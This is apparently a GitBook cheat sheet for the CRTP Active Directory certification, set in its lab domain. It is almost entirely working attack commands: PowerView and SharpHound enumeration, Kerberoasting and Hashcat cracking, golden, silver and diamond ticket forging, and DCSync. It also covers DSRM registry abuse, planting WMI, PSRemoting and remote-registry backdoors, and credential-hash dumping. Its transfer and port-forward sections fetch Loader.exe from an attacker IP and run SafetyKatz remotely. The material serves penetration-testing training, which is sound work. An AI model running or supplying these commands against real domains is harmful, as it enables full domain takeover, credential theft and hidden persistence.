---
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# CRTP

## Domain Enumeration

{% tabs %}
{% tab title="Basic" %}
{% code overflow="wrap" %}
```powershell
# Users
Get-DomainUser | select samaccountname
# Computers
Get-DomainComputer | select cn
# DAs
Get-DomainGroupMember -identity "Domain Admins" | select membername
# EAs
Get-DomainGroupMember -identity "Enterprise Admins" -domain <domain> | select membername

# Collect BH data
 \bh_collectors\SharpHound.exe -c all --zipfilename crtp_data --outputdirectory .\bh_collectors\
```
{% endcode %}
{% endtab %}

{% tab title="Shares" %}
{% code overflow="wrap" %}
```powershell
# Create a host list
Get-DomainComputer | ForEach-Object { $_.cn.Trim() } > servers.txt
# Enumerate shares
Invoke-HuntSMBShares -NonPing -OutputDirectory .\ -HostList servers.txt
```
{% endcode %}
{% endtab %}

{% tab title="Trusts" %}
{% code overflow="wrap" %}
```powershell
# Forest domains
Get-ForestDomain | select name
# Domain trusts
Get-DomainTrust
# External trusts
Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
# External trusts (forest root)
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "Filter_Sids"}
# Trusts for all domains in the specified forest
Get-ForestDomain -forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}
Get-DomainTrust -domain eurocorp.local
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Privilege Escalation

{% tabs %}
{% tab title="LA & Sessions" %}
{% code overflow="wrap" %}
```powershell
# Enumerate LA access on domain hosts
Find-PSRemotingLocalAdminAccess

# Create a host list
Get-DomainComputer | ForEach-Object { $_.cn.Trim() } > servers.txt
# List active sessions (no elevated privileges are required on the remote hosts)
Invoke-SessionHunter -NoPortScan -RawResults -Targets .\servers.txt | select Hostname,UserSession,Access
```
{% endcode %}
{% endtab %}

{% tab title="Kerberoasting" %}
Find user accounts used as service accounts with [PowerView](https://x7331.gitbook.io/boxes/tl-dr/active-directory/ad-tools/powerview):

{% code overflow="wrap" %}
```powershell
# Enumerate SPNs with PowerView
Get-DomainUser * -SPN | select samaccountname,serviceprincipalname

# Kerberoast the enumerated accounts with PowerView
Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation

# Kerberoast the target account with PowerView
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# Clear the SPNs of the target account
Set-DomainObject -Identity sqldev -Clear serviceprincipalname
```
{% endcode %}

The `krb5tgs` hashes can be cracked offline using [Hashcat](https://x7331.gitbook.io/boxes/tools/passwords/hashcat) or [JtR](https://x7331.gitbook.io/boxes/tools/passwords/john):

{% code overflow="wrap" %}
```bash
# Crack the hashes using Hashcat
sudo hashcat -m 13100 hashes.kerberoast rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# Crack the hashes using John the Ripper
.\john.exe --wordlist=<wordlist> hashes.kerberoast
```
{% endcode %}
{% endtab %}

{% tab title="Delegations" %}

{% endtab %}
{% endtabs %}

## Persistence

{% tabs %}
{% tab title="GT" %}
Forged TGT using `krbtgt`'s creds → full domain impersonation.

{% code overflow="wrap" %}
```powershell
# Launch a new process as the DA
Loader.exe -path Rubeus.exe -args asktgt /user:<DA> /aes256:<key> /opsec /createnetonly:c:\windows\system32\cmd.exe /show /ptt

# DCSyc
Loader.exe -path SafetyKatz.exe -args "lsadump::dcsync /user:domain\krbtgt" "exit"
```
{% endcode %}
{% endtab %}

{% tab title="ST" %}
Forged TGS → service-level access on a specific host.

<table><thead><tr><th width="140.00006103515625">Service (SPN)</th><th>Provides Access To</th></tr></thead><tbody><tr><td><code>HTTP</code></td><td>WinRM (Windows Remote Management)</td></tr><tr><td><code>CIFS</code></td><td>File system (SMB shares)</td></tr><tr><td><code>HOST</code></td><td>Scheduled tasks, remote service control, WMI (partial, + <code>RPCSS</code>)</td></tr><tr><td><code>RPCSS</code></td><td>WMI (+ <code>HOST</code>), DCOM/RPC endpoint mapper</td></tr><tr><td><code>LDAP</code></td><td>DCSync (requires elevated permissions)</td></tr></tbody></table>

{% hint style="warning" %}
**SPN formatting**: it must conform to Kerberos naming conventions (e.g., `HTTP/web04.corp.com`) and is case-sensitive in some deployments.
{% endhint %}

{% code overflow="wrap" %}
```powershell
# Forge a TGS
Loader.exe -path Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:<rc4> /sid:<domainSID> /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt

# Forge a TGS
Loader.exe -path mimikatz.exe -args "kerberos::golden /sid:<domainSID> /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:<rc4> /user:jeffadmin" "exit"
```
{% endcode %}
{% endtab %}

{% tab title="DT" %}
TGT tampering → Same as GT, but stealthier.

{% code overflow="wrap" %}
```powershell
# Forge TGT using explicit creds
Loader.exe -path Rubeus.exe -args "diamond /krbkey:<aes256key> /user:student337 /password:<password> /enctype:aes /ticketuser:Administrator /ticketuserid:500 /groups:512 /domain:<domain> /dc:<dc-FQDN> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt"

# Forge TGT using a cached ticket
Loader.exe -path Rubeus.exe -args "diamond /krbkey:<aes256key> /tgtdeleg /enctype:aes /ticketuser:Administrator /ticketuserid:500 /groups:512 /domain:<domain> /dc:<dc-FQDN> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt"
```
{% endcode %}
{% endtab %}

{% tab title="DSRM" %}
Built-in local Admin account → can't interactively access the DC by default.

{% code overflow="wrap" %}
```powershell
# Launch a new process as the DA
Loader.exe -path Rubeus.exe -args asktgt /user:<DA> /aes256:<key> /opsec /createnetonly:c:\windows\system32\cmd.exe /show /ptt

# Extract the DSRM password hash
Loader.exe -path SafetyKatz.exe -args "token::elevate" "lsadump::sam" "exit"

# Flip the registry key
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f

# PtH with DSRM credentials (/domain:<hostname-of-the-DC>)
Loader.exe -path SafetyKatz.exe -args "sekurlsa::pth /domain:dcorp-dc /user:administrator /ntlm:<ntlm> /run:powershell.exe" "exit"

# Add the DC as a trusted host (required to access it with RC4 via WinRM)
Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1

# Access the DC via WinRM using the NT hash
Enter-PSSession -cn 172.16.2.1 -Authentication NegotiateWithImplicitCredential
```
{% endcode %}
{% endtab %}

{% tab title="DCSync Rights" %}
Add DCSync rights to a low-priv account:

{% code overflow="wrap" %}
```powershell
# Launch a new process as the DA
Loader.exe -path Rubeus.exe -args asktgt /user:<DA> /aes256:<key> /opsec /createnetonly:c:\windows\system32\cmd.exe /show /ptt

# Launch InviShell (as DA on the new session)
InviShell\RunWithPathAsAdmin.bat

# Assign DCSync rights to the target user (PowerView) (as DA on the new session)
Add-domainobjectacl -targetidentity 'dc=dollarcorp,dc=moneycorp,dc=local' -principalidentity student337 -rights DCSync -principaldomain dollarcorp.moneycorp.local -targetdomain dollarcorp.moneycorp.local

# Perform DCSync (as low-priv user)
Loader.exe -path SafetyKatz.exe -args "lsadump:evasive-dcsync /user:dcorp\krbtgt" "exit"
```
{% endcode %}
{% endtab %}

{% tab title="Security Descriptors" %}
Establish privileged-independent access to remote management interfaces.

{% code overflow="wrap" %}
```powershell
# WMI (RACE)

# On local machine
Set-RemoteWMI -SamAccountName student337 -Verbose

# On remote machine without explicit credentials
Set-RemoteWMI -SamAccountName dcorp\student337 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose

# On remote machine with explicit credentials
Set-RemoteWMI -SamAccountName dcorp\student337 -ComputerName dcorp-dc -Credential Administrator -namespace 'root\cimv2' -Verbose

# Access the target via WMI
Get-WmiObject -Class Win32_OperatingSystem -ComputerName dcorp-dc

# Remove permissions on remote machine
Set-RemoteWMI -SamAccountName dcorp\student337 -ComputerName dcorp-dc -namespace 'root\cimv2' -Remove -Verbose
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
# PSRemoting (unstable post-2020)

# On local machine
Set-RemotePSRemoting -SamAccountName student337 -Verbose

# On remote machine without credentials (the error is expected)
Set-RemotePSRemoting -SamAccountName dcorp\student337 -ComputerName dcorp-dc -Verbose

# Access the target host
Enter-PSSession dcorp-dc

# Remopve the permissions from the remote machine
Set-RemotePSRemoting -SamAccountName dcorp\student337 -cn dcorp-dc -Remove
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
# Remote registry (disabled by default)

# Assign remote registry access to the target user
Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student337 -Verbose

# Retrieve machine account hash (and continue with a ST attack!)
Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose

# Retrieve local account hash
Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose

# Retrieve domain cached credentials
Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Misc

{% tabs %}
{% tab title="Transfers" %}
{% code overflow="wrap" %}
```powershell
# Copy a file to a share
echo F | xcopy Loader.exe \\dcorp-?\c$\users\public\Loader.exe
# Download a file
iwr 'http://172.16.100.37/Loader.exe' -OutFile c:\users\public\loader.exe
```
{% endcode %}
{% endtab %}

{% tab title="Port Forward" %}
Directly:

{% code overflow="wrap" %}
```powershell
# Connect to the target host
winrs -r:<target> cmd

# Create a port forward
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0. connectport=80 connectaddress=172.16.100.37

# Run binary
c:\users\public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::evasive-keys" "exit"
```
{% endcode %}

Via WinRS:

{% code overflow="wrap" %}
```powershell
# Create a port forward via winrs
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0. connectport=80 connectaddress=172.16.100.37"

# Run binary via winrs
$null | winrs -r:dcorp-mgmt "cmd /c c:\users\public\loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
```
{% endcode %}
{% endtab %}
{% endtabs %}
